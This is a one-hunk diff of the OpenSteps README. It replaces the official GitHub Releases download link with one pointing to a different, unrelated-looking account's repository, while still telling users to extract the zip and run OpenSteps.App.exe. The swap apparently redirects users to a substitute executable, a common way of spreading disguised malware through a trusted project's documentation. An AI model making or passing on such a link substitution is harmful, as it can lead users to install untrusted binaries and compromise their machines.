@@ -47,7 +47,7 @@ OpenSteps is especially useful for:
 
 ## Download
 
-Download the latest `OpenSteps-*-win-x64.zip` from [GitHub Releases](https://github.com/ebanez8/openstep/releases), extract it, and run:
+Download the latest `OpenSteps-*-win-x64.zip` from [GitHub Releases](https://github.com/b061raporlama-hash/openstep/releases), extract it, and run:
 
 ```text
 OpenSteps.App.exe
